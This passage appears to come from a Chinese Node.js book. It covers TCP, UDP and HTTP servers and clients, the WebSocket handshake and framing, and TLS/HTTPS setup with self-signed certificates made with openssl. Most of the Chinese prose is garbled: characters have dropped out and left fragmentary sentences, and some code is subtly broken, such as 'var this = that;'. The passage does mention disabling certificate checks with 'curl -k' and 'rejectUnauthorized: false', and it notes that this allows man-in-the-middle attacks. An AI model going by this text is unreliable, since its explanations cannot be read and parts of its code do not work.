fs/read-stream-throughput.js type=buf size=1024: 46.284 fs/read-stream-throughput.js type=buf size=4096: 139.62 fs/read-stream-throughput.js type=buf size=65535: 681.88 fs/read-stream-throughput.js type=buf size=1048576: 857.98 
从上的我们可以到，读一个相的大时，highWaterMark的大小与读的关系大，读。
6.5
过JavaScript友好的作后，有些开发者可能会定势，Buffer做解。与Buffer之有实质上的，Buffer是数，与Buffer之在编关系。因，解Buffer的多分要，对于高数分有用。
6.6
本的源下
. http://nodejs.org/docs/latest/api/buffer.html 
. http://nodejs.org/docs/latest/api/string_decoder.html 
. https://github.com/bnoordhuis/node-iconv 
. https://github.com/ashtuchkin/iconv-lite . http://httpd.apache.org/docs/2.2/programs/ab.html 
. http://cnodejs.org/user/fool 
. http://en.wikipedia.org/wiki/Slab_allocation 
. https://www.ibm.com/developerworks/cn/linux/l-linux-slab-allocator/

 
第章 



Node是一个网生的，它有事驱动、、线程性，好的可性，使它分量，在分网中样的。时Node的API分网，用它的API灵活的网服务。从本起，我Node在网服务的能。
用Node可以分网服务。在Web，大多数的编程语言要门的Web服务作为，ASP、ASP.NET要IIS作为服务，PHP要ApacheNginx环境，JSP要Tomcat服务。对于Node言，只要几可服务，外的。
Node了net、dgram、http、https这4个，分用于TCP、UDP、HTTP、HTTPS，用于服务端客端。
7.1TCP 
TCP服务在网应用中分，目前大多数的应用都是于TCP的。
7.1.1TCP 
TCP为，在OSI（由组，分为、数、网、、会、、应用）中于。多应用于TCP，的是HTTP、SMTP、IMAP。图图7-1。

图7-1 OSI（）
TCP是接的，的是在之前要3次会，
图7-2。

图7-2 TCP在之前的3次
只有会之后，服务端客端之才能相发数
。在创会的过程中，服务
端客端分一个接
，这个接一个接。服务端与客端过接实者之接的作。
7.1.2TCP
在本了解TCP的工作之后，我们可以开始创一个TCP服务端接网请，下
var net = require('net'); 
var server = net.createServer(function (socket) { 
// 的接
socket.on('data', function (data) { 
 socket.write(""); 
}); 
socket.on('end', function () { 
 console.log('接开'); 
}); 
socket.write("入出Node.js：\n"); 
}); 
server.listen(8124, function () { 
console.log('server bound'); 
}); 
我们过net.createServer(listener)可创一个TCP服务，listener是接事connection的，也可以用下的
var server = net.createServer(); 
server.on('connection', function (socket) { 
// 的接}); server.listen(8124); 
我们可以用Telnet工作为客端对才创的服务会，相关下
$ telnet 127.0.0.1 8124 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. 入出Node.js：hi 

了端外，样我们也可以对Domain Socket，下
server.listen('/tmp/echo.sock'); 
过nc工会，测试上的TCP服务的下
$ nc -U /tmp/echo.sock 入出Node.js：hi 

过net自客端会，测试上的TCP服务的下
var net = require('net'); 
var client = net.connect({port: 8124}, function () { //'connect' listener console.log('client connected'); client.write('world!\r\n'); 
}); 
client.on('data', function (data) { console.log(data.toString()); client.end(); 
}); 
client.on('end', function () { console.log('client disconnected'); }); 
以上客端为client.js并，下
$ node client.js  client connected 入出Node.js：

client disconnected 
与使用Telnetnc的会并。是Domain Socket，在写时，写path可，下var client = net.connect({path: '/tmp/echo.sock'}); 
7.1.3TCP
在上的中，分为服务事接事。
1. 
对于过net.createServer()创的服务言，它是一个EventEmitter实，它的自定事有下几。
. listening在用server.listen()定端者Domain Socket后触发，写为server.listen(port,listeningListener)，过listen()的个数入。
. connection个客端接接到服务端时触发，写为过net.create-
Server()，最后一个数。
. close服务关时触发，在用server.close()后，服务接新的接接，前在的接，有接都开后，会触发事。

. error服务发生时，会触发事。一个使用中的端，会触发一个，不error事，服务会。
2. 
服务可以时与多个客端接，对于个接言是的可写可读Stream对。Stream对可以用于服务端客端之的信，可以过data事从一端读一端发的数，也可以过write()从一端一端发数。它有下自定事。
. data一端用write()发数时，一端会触发data事，事的数是

write()发的数。. end接中的一端发了FIN数时，会触发事。

. connect事用于客端，接与服务端接时会触发。
. drain一端用write()发数时，前这端会触发事。

. error发生时，触发事。
. close接关时，触发事。. timeout一定时后接不活跃时，事会触发，用前接已经了。

外，由于TCP接是可写可读的Stream对，可以用pipe()实管作，下实了一个echo服务
var net = require('net'); 
var server = net.createServer(function (socket) { socket.write('Echo server\r\n'); socket.pipe(socket); 
}); 
server.listen(1337, '127.0.0.1'); 
的是，TCP对网中的小数包有一定的优Nagle。次只发一个的内不优，网中只有极数有数的数包，分网源。Nagle对这情，要区的数到一定数量者一定时后才发，以小数包会Nagle并，以优网。这优使网有使用，是数有可能发。
在Node中，由于TCP认用了Nagle，可以用socket.setNoDelay(true)Nagle，使write()可以立发数到网中。
一个要的是，管在网的一端用write()会触发一端的data事，是并不着次write()都会触发一次data事，在关Nagle后，一端可能会接收到的多个小数包并，后只触发一次data事。
7.2UDP 
UDP用数包，与TCP一样于网。UDP与TCP最大的不是UDP不是接的。TCP中接一立，有的会都于接
，客端要与一个TCP服务信，要创一个接接
。在UDP中，一个接可以与多个UDP服务信，它
事务的不可信服务，在网的情下在包的问题，是由于它接，源，且灵活，以应用在一个数包也不会产生大的场景，、。UDP目前应用很广，DNS服务是于它实的。
7.2.1UDP
创UDP接分，UDP接一创，可以作为客端发数，也可以作为服务端接收数。下的创了一个UDP接
var dgram = require('dgram'); var socket = dgram.createSocket("udp4"); 
7.2.2UDP
想UDP接接收网，只要用dgram.bind(port, [address])对网端定可。以下为一个的服务端
var dgram = require("dgram"); 
var server = dgram.createSocket("udp4"); 
server.on("message", function (msg, rinfo) { console.log("server got: " + msg + " from " +  rinfo.address + ":" + rinfo.port); }); 
server.on("listening", function () { var address = server.address(); 
console.log("server listening " + address.address + ":" + address.port); }); 
server.bind(41234); 
接接收有网上41234端上的。在定后，触发listening事。
7.2.3UDP
接下我们创一个客端与服务端对，下
var dgram = require('dgram'); 
var message = new Buffer("入出Node.js"); 
var client = dgram.createSocket("udp4"); 
client.send(message, 0, message.length, 41234, "localhost", function(err, bytes) { 
client.close(); 
}); 
为client.js并，服务端的会有下
$ node server.js  server listening 0.0.0.0:41234 server got:入出Node.js from 127.0.0.1:58682 
接对用在客端时，可以用send()发到网中。send()的数下
socket.send(buf, offset, length, port, address, [callback])
这些数分为要发的Buffer、Buffer的、Buffer的、目端、目、发后的。与TCP接的write()相，send()的数相对复杂，是它灵活的在于可以发数到网中的服务端，TCP要发数一个服务端，
要新过接新的接。
7.2.4UDP
UDP接相对TCP接使用起，它只是一个EventEmitter的实，Stream的实。它下自定事。
. messageUDP接网端后，接收到时触发事，触发的数为Buffer对一个程信。
. listeningUDP接开始时触发事。
. close用close()时触发事，并不触发message事。次触发message事，新定可。

. error发生时触发事，不，接，使程。

7.3HTTP 
TCP与UDP都于网，要高的网应用，就应从着。
是对于经的应用场景，从入自己的应用，HTTPSMTP，这些经的应用对于应用言有余。Node了本的httphttps用于HTTP HTTPS的，对于他应用的，也能从社区中到实。
在Node中HTTP服务极，Node网上的经就了用寥寥几实一个HTTP服务，下
var http = require('http'); 
http.createServer(function (req, res) { 
res.writeHead(200, {'Content-Type': 'text/plain'}); 
res.end('Hello World\n'); 
}).listen(1337, '127.0.0.1'); 
console.log('Server running at http://127.0.0.1:1337/'); 
管这个HTTP服务到只能复Hello World，是它能的并发量QPS都是不小的，后的因在3中有，我们不探。这我们开性能，只对HTTP服务在应用的实开、研。
7.3.1HTTP 
1. HTTP 
HTTP的是本，写作HyperTextTransfer Protocol。了解Web，了解HTTP会极大高我们对Web的认。HTTP在TCP之上，于应用。在HTTP的端是服务，的B/S，今的Web是HTTP的应用。
HTTP以发是W3CIETF个组织作的，他们最发了一系RFC，目前最的HTTP为RFC2616。
2. HTTP
为了解HTTP的，在动上服务端后，我们对经一次的，这用的工是curl，过-v，可以这次网信的有信，下
$ curl -v http://127.0.0.1:1337 
* 
About to connect() to 127.0.0.1 port 1337 (#0) *  Trying 127.0.0.1... 

* 
connected 

* 
Connected to 127.0.0.1 (127.0.0.1) port 1337 (#0) > GET / HTTP/1.1 > User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 > Host: 127.0.0.1:1337 > Accept: */* > < HTTP/1.1 200 OK < Content-Type: text/plain < Date: Sat, 06 Apr 2013 08:01:44 GMT < Connection: keep-alive < Transfer-Encoding: chunked < Hello World 

* 
Connection #0 to host 127.0.0.1 left intact 

* 
Closing connection #0 


从上信中我们可以到这次网信的信分为几个部分，一部分内为经的TCP的3次过程，下
* 
About to connect() to 127.0.0.1 port 1337 (#0) *  Trying 127.0.0.1... 

* 
connected 

* 
Connected to 127.0.0.1 (127.0.0.1) port 1337 (#0) 


部分是在之后，客端服务端发请，下
> GET / HTTP/1.1 > User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 > Host: 127.0.0.1:1337 > Accept: */* > 
部分是服务端后，客端发应内，包括应应，下
< HTTP/1.1 200 OK < Content-Type: text/plain < Date: Sat, 06 Apr 2013 08:01:44 GMT < Connection: keep-alive < Transfer-Encoding: chunked < Hello World 
最后部分是会的信，下
* 
Connection #0 to host 127.0.0.1 left intact 

* 
Closing connection #0 


从上的信中可以HTTP的，它是于请应的，以一问一的实服务，于TCP会，是本并会的。
从的，在的应用，，实是一个HTTP的，用的为会过它为HTTP请发服务端，服务端在请后，发应，在解后，用要的内在上。以开一图为，HTTP发图服务端后，服务端中的要请的，中的图以的发接收图后，用用。言之，HTTP服务只做事情HTTP请发HTTP应。
是HTTP请还是HTTP应，内都包个部分。
上的中><部分于的部，由于是GET请，请中没有包，应中的Hello World是。
7.3.2http
Node的http包对HTTP的。在Node中，HTTP服务继自TCP服务（net），它能与多个客端接，由于用事驱动的，并不为一个接创外的线程程，很的内用，以能实高并发。HTTP服务与TCP服务有区的
在于，在开keepalive后，一个TCP会可以用于多次请应。TCP服务以connection为服务，HTTP服务以request为服务。http是connection到request的过程了，图图7-3。

图7-3 httpconnection到request的过程了
之外，http接用接的读写为ServerRequestServerResponse对，它们分对应请应作。在请产生的过程中，http到接中的数，用http_parser解，在解请的后，触发request事，用用的务。程的图图7-4。

图7-4 http产生请的程
图7-4中的程序对应到中的就是应Hello World这部分，下
function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n'); 
} 
1. HTTP
对于TCP接的读作，http为ServerRequest对。我们次前的请，部会过http_parser解。请的下
> GET / HTTP/1.1 > User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 > Host: 127.0.0.1:1337 > Accept: */* > 
一GET / HTTP/1.1解之后分解为下性。
. req.method性为GET，是为请，的请有GET、POST、DELETE、PUT、CONNECT几。
. req.url性为/。. req.httpVersion性为1.1。余是很的Key: Value，解后在req.headers性上务以

用，下
headers:  
{ 'user-agent': 'curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5',
 host: '127.0.0.1:1337', 
 accept: '*/*' }, 
部分为一个只读对，务要读中的数，要在这个数后才能作，下
function (req, res) { 
// console.log(req.headers); 
var buffers = []; 
req.on('data', function (trunk) { 
 buffers.push(trunk); 
}).on('end', function () { 
buffer = Buffer.concat(buffers); 
 // var TODO
 res.end('Hello world'); 
}); 
} 
HTTP请对HTTP应对是相对的，的WebConnectExpress都是在这个对的上高的。
2. HTTP
HTTP应对。HTTP应相对一些，它了对接的写作，可以一个可写的对。它应部信的API为res.setHeader() res. writeHead()。在上中
res.writeHead(200, {'Content-Type': 'text/plain'}); 
分为setHeader()writeHead()个。它在http的下，实生下
< HTTP/1.1 200 OK < Content-Type: text/plain 
我们可以用setHeader多次，只有用writeHead后，才会写入到接中
。之外，http会自动你一些信，下
< Date: Sat, 06 Apr 2013 08:01:44 GMT < Connection: keep-alive < Transfer-Encoding: chunked < 
部分是用res.write()res.end()实，后者与前者的在于res.end()会用write()发数，后发信服务这次应，应下
Hello World 
应后，HTTP服务可能会前的接用于下一个请，者关接。的是，是在发前发的，一开始了数的发，writeHead()setHeader()不生。这由的性决定。
外，服务端在务时是否发生，务在时用res.end()请
，否客端一于的。，也可以过res.end()的实客端与服务端之的接，时。
3. HTTP
TCP服务一样，HTTP服务也了一些事，以应用使用，样的是，服务也是一个EventEmitter实。
. connection事在开始HTTP请应前，客端与服务端要立的TCP接，这个接可能因为开了keep-alive，可以在多次请应之使用
这个接立时，服务触发一次connection事。

. request事立TCP接后，http在数中HTTP请HTTP应，请数发到服务端，在解HTTP请后，会触发事在res.end()
后，TCP接可能用于下一次请应。
. close事与TCP服务的为一，用server.close()接新的接，已有的接都开时，触发事可以server.close()一个数事。
. checkContinue事些客端在发大的数时，并不会数接发，是发一个部Expect: 100-continue的请到服务，服务会触发checkContinue事没有为服务这个事，服务会自动应客端100 Continue的，接数上不接数的多时，应客端400 Bad Request绝客端继续发数可。要的是，事发生时不会触发request事，个事之。客端收到100 Continue后新发起请时，才会触发request事
。
. connect事客端发起CONNECT请时触发，发起CONNECT请在HTTP时不事，发起请的接会关。
. upgrade事客端要接的时，要服务端，客端会在请中上Upgrade，服务端会在接收到这样的请时触发事。这在后的WebSocket部分有程的。不事，发起请的接会关。
. clientError事接的客端触发error事时，这个会到服务端，时触发事。

7.3.3HTTP
在对服务端的实了后，HTTP客端的几不用，因为它就是服务端服务的一部分，于HTTP的一端，在个的与中，由它产生。时http了一个APIhttp.request(options, connect)，用于HTTP客端。
下的与上的curl大相
var options = { hostname: '127.0.0.1', port: 1334, path: '/', method: 'GET' 
}; 
var req = http.request(options, function(res) { console.log('STATUS: ' + res.statusCode); console.log('HEADERS: ' + JSON.stringify(res.headers)); res.setEncoding('utf8'); res.on('data', function (chunk) { 
 console.log(chunk); }); }); 
req.end(); 
上到以下
$ node client.js  STATUS: 200 HEADERS: {"date":"Sat, 06 Apr 2013 11:08:01 GMT","connection":"keep-alive","transfer-encoding":"chunked"} Hello World 
中options数决定了这个HTTP请中的内，它的有下这些。
. host服务的IP，认为localhost。
. hostname服务。. port服务端，认为80。

. localAddress立网接的本网。

. socketPathDomain接。
. methodHTTP请，认为GET。
. path请，认为/。
. headers请对。
. authBasic认，这个请中的Authorization部分。

的内由请对的write()end()实过write()接中写入数，
过end()。它与中的Ajax用几相，Ajax的实质就是一个的
网HTTP请。
1. HTTP
HTTP客端的应对与服务端为，在ClientRequest对中，它的事做response。ClientRequest在解应时，一解应就触发response事，时一个应对以作ClientResponse。后续应以只读的，下
function(res) { console.log('STATUS: ' + res.statusCode); console.log('HEADERS: ' + JSON.stringify(res.headers)); res.setEncoding('utf8'); res.on('data', function (chunk) { 
 console.log(chunk); }); } 
由于从应读数与服务端ServerRequest读数的为为，不。
2. HTTP 
服务端的实一，http的ClientRequest对也是于TCP实的，在keepalive的情下，一个会接可以多次用于请。为了用TCP接，http包一
个认的客端对http.globalAgent。它对个服务端（host + port）创的接了管，认情下，过ClientRequest对对一个服务端发起的HTTP请最多可以创5
个接。它的实质是一个接，图图7-5。

图7-5 HTTP对服务端创的接管

用HTTP客端时对一个服务发起10次HTTP请时，实质只有5个请于并发
，后续的请要个请服务后才发。这与对一个有下接数的是相的为。
你在服务端过ClientRequest用网中的他HTTP服务，关对对网请的。一请量过大，接会服务性能。要，可以在options中agent。认情下，请会用的对，认接数的为5。
我们可以自对，下
var agent = new http.Agent({ 
maxSockets: 10 }); var options = { 
hostname: '127.0.0.1', port: 1334, path: '/', method: 'GET', agent: agent 
}; 
也可以agent为false，以接的管，使请不并发的。Agent对的socketsrequests性分前接中使用中的接数于的请数，在务中这个有于发务的程。
3. HTTP
与服务端对应的，HTTP客端也有相应的事。
. response与服务端的request事对应的客端在请发后到服务端应时，会触发事。
. socket接中立的接分前请对时，触发事。
. connect客端服务端发起CONNECT请时，服务端应了200，客
端会触发事。
. upgrade客端服务端发起Upgrade请时，服务端应了101 Switching Protocols，客端会触发事。

. continue客端服务端发起Expect: 100-continue信，以试图发大数量，
服务端应100 Continue，客端触发事。

7.4WebSocket 
到Node，不能过的是WebSocket。它与Node之的，由有。
. WebSocket客端于事的编程与Node中自定事相几。
. WebSocket实了客端与服务端之的接，Node事驱动的分与大


量的客端高并发接。之外，WebSocket与统HTTP有下好。
客端与服务端只立一个TCP接，可以使用的接。
. WebSocket服务端可以推数到客端，这HTTP请应灵活、高。
有量的，数量。
WebSocket最是作为HTML5要性的，最在W3CIETF的推动下，RFC 6455。大多都WebSocket，接下我们用一WebSocket在客端的应用
var socket = new WebSocket('ws://127.0.0.1:12010/updates'); 
socket.onopen = function () { 
setInterval(function() { 
 if (socket.bufferedAmount == 0) 
socket.send(getUpdateData()); 
}, 50); 
}; 
socket.onmessage = function (event) { 
// TODO：event.data 
}; 
上中，与服务端创WebSocket请，在请后接开，50服务端发一次数，时可以过onmessage()接收服务端的数
。这为与TCP客端分相，相于HTTP，它能信。一能使用WebSocket，可以想应用的使用极大。
在WebSocket之前，网页客端与服务端信最高的是Comet技术。实Comet技术的是用（long-polling）iframe。的是客端服务端发起请，服务端只在时有数应时开接（res.end()）客端在收到数者时后新发起请。这个请为着的，是用Comet（）它。
使用WebSocket的，网页客端只一个TCP接可信，在服务端与客端信时，开接发请。接可以到高应用，编程也分。
前也多到了WebSocket与HTTP的区，相HTTP，WebSocket接于，它并没有在HTTP的上服务端的推，是在TCP上定立的。人的部分在于WebSocket的部分是由HTTP的，使人它可能是于HTTP实的。
WebSocket要分为个部分数。下我们一这个部分。
7.4.1WebSocket
客端立接时，过HTTP发起请，下
GET /chat HTTP/1.1 Host: server.example.com Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== Sec-WebSocket-Protocol: chat, superchat Sec-WebSocket-Version: 13 
与的HTTP请有区的部分在于下这些
Upgrade: websocket Connection: Upgrade 
上个请服务端为WebSocket。中Sec-WebSocket-Key用于
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== 
Sec-WebSocket-Key的是机生的Base64编的。服务端接收到之后与258EAFA5-E914-47DA-95CA-C5AB0DC85B11相，dGhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11，后过sha1后，Base64编，最后客端。这个下
var crypto = require('crypto'); var val = crypto.createHash('sha1').update(key).digest('base64'); 
外，下个定本
Sec-WebSocket-Protocol: chat, superchat Sec-WebSocket-Version: 13 
服务端在请后，应下
HTTP/1.1 101 Switching Protocols Upgrade: websocket Connection: Upgrade Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo= Sec-WebSocket-Protocol: chat 
上的之客端在，新应用为WebSocket，并在前的接接上应用新。余的分服务端于Sec-WebSocket-Key生的中的。客端会Sec-WebSocket-Accept的，，开始接下的数。
这我们用Node发起的为，下
var WebSocket = function (url) { // 代码解析ws://127.0.0.1:12010/updates用请求this.options = parseUrl(url); this.connect(); 
}; WebSocket.prototype.onopen = function () { // TODO }; 
WebSocket.prototype.setSocket = function (socket) { this.socket = socket; }; 
WebSocket.prototype.connect = function () { var this = that; var key = new Buffer(this.options.protocolVersion + '-' + Date.now()).toString('base64'); var shasum = crypto.createHash('sha1'); 
var expected = shasum.update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64'); 
var options = {  port: this.options.port, // 12010 host: this.options.hostname, // 127.0.0.1 headers: { 
'Connection': 'Upgrade', 'Upgrade': 'websocket', 'Sec-WebSocket-Version': this.options.protocolVersion, 'Sec-WebSocket-Key': key
 } }; var req = http.request(options); req.end(); 
req.on('upgrade', function(res, socket, upgradeHead) {  //接成功 that.setSocket(socket);  //发open事件 that.onopen(); 
}); }; 
下是服务端的应为
var server = http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n'); 
}); server.listen(12010); 
//在收upgrade请求客户端换
server.on('upgrade', function (req, socket, upgradeHead) { var head = new Buffer(upgradeHead.length); upgradeHead.copy(head);  var key = req.headers['sec-websocket-key']; var shasum = crypto.createHash('sha1'); key = shasum.update(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").digest('base64'); var headers = [ 
 'HTTP/1.1 101 Switching Protocols',  'Upgrade: websocket',  'Connection: Upgrade',  'Sec-WebSocket-Accept: ' + key,  'Sec-WebSocket-Protocol: ' + protocol 
]; // 数据发socket.setNoDelay(true); socket.write(headers.concat('', '').join('\r\n')); // 建服务器端WebSocket接var websocket = new WebSocket(); websocket.setSocket(socket); 
}); 
一WebSocket，服务端与客端会对的，都能接收发。
7.4.2WebSocket
在后，前接不HTTP的，是开始WebSocket的数，实客端与服务端的数。图7-6为过程图。

图7-6过程图
后，客端的onopen()会触发，下
socket.onopen = function () { 
// TODO: opened() 
}; 
服务端没有onopen()可言。为了TCP接事到WebSocket事的，要
在接收数时，WebSocket的数是在data事上的，下
WebSocket.prototype.setSocket = function (socket) { 
this.socket = socket; 
this.socket.on('data', this.receiver); 
}; 
样的数发时，也要做作，下
WebSocket.prototype.send = function (data) { this._send(data); }; 客端用send()发数时，服务端触发onmessage()服务端用send()发数时，客端的onmessage()触发。我们用send()发一数时，可能这个数为一多数，后发。为了，客端要对发的数，服务一收到（
中），接关。服务发到客端的数做，样，
客端收到的数，接也关。
我们以客端发hello world!到服务端，服务端以yakexi作为一个程研数的实过程。
图7-7中为WebSocket数的定，8为一，也1个。中一都有它的。

图7-7 WebSocket 数的定
. fin这个数是最后一，这个fin为1，余情为0。一个数没有分为多时，它是一也是最后一。
. rsv1、rsv2、rsv3为1，3个识用于，有已的时，这些可能为1，余情为0。
. opcode为4的作，可以用0到15的，用于解前数。0加数，1本数，2数，8发一个接关的数，9 ping数，10pong数，余时没有定。ping数pong数用于心测，一端发ping数时，一端发pong数作为应，对这一端于应。
. masked是否，为1。客端发服务端时为1，服务端发客端时为0。
. payload length一个7、7+167+64的数，识数的，在0~125之，就是数的实是126，后16的是数的实是127，后64的是数的实。
. masking keymasked为1时在，是一个32的数，用于解数。
. payload data我们的目数，数为8的数。
客端发时，要一个多个数。由于hello world!，不在分为多个数的情，由于hello world!会以本的发，它的payload length为96（128/），为1100000。以应下
fin(1) + res(000) + opcode(0001) + masked(1) + payload length(1100000) + masking key(32位) + payload data(hello world!加密的进制) 
以本发时，本的编为UTF-8，由于这发的不在中，以一个一个，8。
客端发后，服务端在data事中接收到这些编数，后解为相应的数，以数的，过的数解，后触发onmessage()，下
socket.onmessage = function (event) { 
// TODO: event.data 
}; 
服务端复yakexi的时候，下的事情就是，余相，下
fin(1) + res(000) + opcode(0001) + masked(0) + payload length(1100000) + payload data(yakexi的进制) 
这的为与TCP接的为分，可以解为TCP客端接的connect事data事。
至，WebSocket的，解数触发onmessage()，请ws的实，由于有过多，这不开。
7.4.3
在有的WebSocket服务端实中，没有NodeWebSocket的使用了。它们的性有以下内。于事的编程接。
于JavaScript，以好的WebSocket实，API与客端可以高相。
外，Node于事驱动的使它应对WebSocket这接的应用场景可以大量并发请。管Node没有内WebSocket的，是社区的ws了WebSocket的实。socket.io是在它的上实的。
7.5
在网中，数在服务端客端之，由于是的内，一在网人，数就可能一余在中的者前。为我们要数加后网，这样使数，者也数的实内是。是对于我们的应用言，HTTP、FTP，我们能数，心网过程中的问题。在网景的NetScape推之初就了SSL（Secure Sockets Layer，
接）。SSL作为一，它在
对网接加
的能。对于应用
言，它是的，数在到应用之前就已经了加解的过程。最初的SSL应用在Web上，服务端端时，后IETF，为TLS
（Transport Layer Security，）。
Node在网上了3个，分为crypto、tls、https。中crypto要用于加解，SHA1、MD5加都在中有，在这我们不用。用于网的是外个，tls了与net的能，区在于它立在TLS/SSL加的TC
P接上。对于https言，它与http接一，区也仅在于它立于的接之上。
7.5.1TLS/SSL 
1. 
TLS/SSL是一个/的，它是一个对的
，个服务端客端都有自
己的
。用加要的数，用解接收到的数
。是对的，过加的数，只有过才能解，以在立之前，客端服务端之
要。客端发数时要过服务端的加，服务端发数时要客端的加，才能加解的过程，图7-8。

图7-8客端服务端
Node在用的是openssl实TLS/SSL的
，为要生可以过openssl。我们分为服务端客端生，下
//生成服务器端私$ openssl genrsa -out server.key 1024 //生成客户端私$ openssl genrsa -out client.key 1024 
上生了个1024的RSA，我们可以过它继续生，下
$ openssl rsa -in server.key -pubout -out server.pem $ openssl rsa -in client.key -pubout -out client.pem 
的对加好，是网中可能在的情，的是中人。客端服务端在的过程中，中人对客端服务端的，对服务端客端的，因客端服务端几不到中人的在。为了解决这问题，数过程中还要对到的认，以认到的是自目服务。不能这认，中人可能会的应用，从经。图7-9是中人的图。

图7-9中人图
为了解决这个问题，TLS/SSL入了数书认。与接用不，数书中包了服务的机、服务的、发机的、自发机的。在接立前，会过书中的认收到的是自目服务的，从产生信关系。
2. 
为了我们的数，在我们入了一个CA（Certificate Authority，数
书认中心）。CA的作用是为发书，且这个书中有CA过自己的实的。
为了到书，服务端要过自己的生CSR（Certificate Signing Request，书请）。CA机过这个发于服务端的书，只要过CA机就能书是否。
过CA机发书是一个的过程，要一定的用
。对于中小
言，多是用自书网的。自书，就是自己CA机，自己的服务端发书。以下为生、生CSR、过自生书的过程
$ openssl genrsa -out ca.key 1024 $ openssl req -new -key ca.key -out ca.csr $ openssl x509 -req -in ca.csr -signkey ca.key -out ca.crt 
程图7-10。

图7-10生自书图
上了CA要的。接下到服务端，服务端要CA机
请书。在请书之前是要创自己的CSR。
的是，这个过程中的Common Name要服务，否在后续的认过程中会。下是生CSR用的
$ openssl req -new -key server.key -out server.csr 
到CSR后，我们自己的CA机请。过程要CA的书与，
最发一个有CA的书，下
$ openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -in server.csr -out server.crt 
客端在发起接前会服务端的书，并过CA的书服务端书的
。了外，还有对服务、IP的过程。这个过程图7-11。

图7-11客端过CA服务端书的过程图
CA机书发服务端后，书在请的过程中会发客端
，客端要过CA的书。是的CA机，它们的书一在中。是自己CA机，发自有书不能享这个，客端要到CA的书才能
。
上的过程中可以，书是一环一环发的，是在CA的书是不要上书与的，这个书我们为书。
7.5.2TLS
1. 
服务要的书都之后，我们过Node的tls创一个的TCP服务，这个服务是一个的echo服务，下
var tls = require('tls'); var fs = require('fs'); 
var options = { key: fs.readFileSync('./keys/server.key'), cert: fs.readFileSync('./keys/server.crt'), requestCert: true, ca: [ fs.readFileSync('./keys/ca.crt') ] 
}; 
var server = tls.createServer(options, function (stream) { console.log('server connected', stream.authorized ? 'authorized' : 'unauthorized'); stream.write("welcome!\n"); stream.setEncoding('utf8'); stream.pipe(stream); 
}); server.listen(8000, function() { 
console.log('server bound'); }); 
动上服务后，过下的可以测试书是否
$ openssl s_client -connect 127.0.0.1:8000 
2. TLS
为了个系，接下我们用Node客端，net一样，tls也了connect()客端。在我们的客端之前，要为客端生于自己的
，下
//创建私$ openssl genrsa -out client.key 1024 //生成CSR $ openssl req -new -key client.key -out client.csr //生成名证$ openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -in client.csr -out client.crt 
并创客端，下
var tls = require('tls'); var fs = require('fs'); 
var options = { key: fs.readFileSync('./keys/client.key'), cert: fs.readFileSync('./keys/client.crt'), ca: [ fs.readFileSync('./keys/ca.crt') ] 
}; 
var stream = tls.connect(8000, options, function () { console.log('client connected', stream.authorized ? 'authorized' : 'unauthorized'); process.stdin.pipe(stream); 
}); 
stream.setEncoding('utf8'); stream.on('data', function(data) { 
console.log(data); }); stream.on('end', function() { 
server.close(); }); 
动客端的过程中，用到了为客端生的、书、CA书
。客端动之后可以在入中入数，服务端会应相的数。至我们了TLS的服务端客端的创。与的TCP服务端客端相，TLS的服务端客端仅仅只在书的上有
，余部分本相。
7.5.3HTTPS
HTTPS服务就是工作在TLS/SSL上的HTTP。在了解了TLS服务后，创HTTPS服务是不过的事情。
1. 
HTTPS服务要用到书，我们可以接用上生的书。
2. HTTPS
创HTTPS服务只HTTP服务多一个，余几相，下
var https = require('https'); var fs = require('fs'); 
var options = { key: fs.readFileSync('./keys/server.key'), cert: fs.readFileSync('./keys/server.crt') 
}; 
https.createServer(options, function (req, res) { res.writeHead(200); res.end("hello world\n"); 
}).listen(8000); 
动之后过curl测试，相关下
$ curl https://localhost:8000/ curl: (60) SSL certificate problem, verify that the CA cert is OK. Details: error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed More details here: http://curl.haxx.se/docs/sslcerts.html 
curl performs SSL certificate verification by default, using a "bundle"  of Certificate Authority (CA) public keys (CA certs). If the default  bundle file isn't adequate, you can specify an alternate file  using the --cacert option. 
If this HTTPS server uses a certificate signed by a CA represented in  the bundle, the certificate verification probably failed due to a  problem with the certificate (it might be expired, or the name might  not match the domain name in the URL). 
If you'd like to turn off curl's verification of the certificate, use  the -k (or --insecure) option. 
由于是自的书，curl工服务端书是否，以了上的，要解决上的问题有。一是加-k，curl工书的，这样的是数会过加，是对是可的，会在中人的在。下
$ curl -k https://localhost:8000/ hello world 
一解决的是curl--cacert，CA书使之对服务书的，下
$ curl --cacert keys/ca.crt https://localhost:8000/ hello world 
3. HTTPS
对应的，我们也会用Node实HTTPS的客端，与HTTP的客端相不大，了定书相关的数外，下
var https = require('https'); var fs = require('fs'); 
var options = { hostname: 'localhost', port: 8000, path: '/', method: 'GET', key: fs.readFileSync('./keys/client.key'), cert: fs.readFileSync('./keys/client.crt'), ca: [fs.readFileSync('./keys/ca.crt')] 
}; 
options.agent = new https.Agent(options); 
var req = https.request(options, function(res) { res.setEncoding('utf-8'); res.on('data', function(d) {
 console.log(d); 
}); }); req.end(); 
req.on('error', function(e) { console.log(e); }); 
上的作到以下
$ node client.js  hello world 
不ca，会到下
[Error: UNABLE_TO_VERIFY_LEAF_SIGNATURE] 
解决的是加性rejectUnauthorized为false，它的与curl工加-k一样，都会在数过程中会加，是服务端的书不是的。
7.6
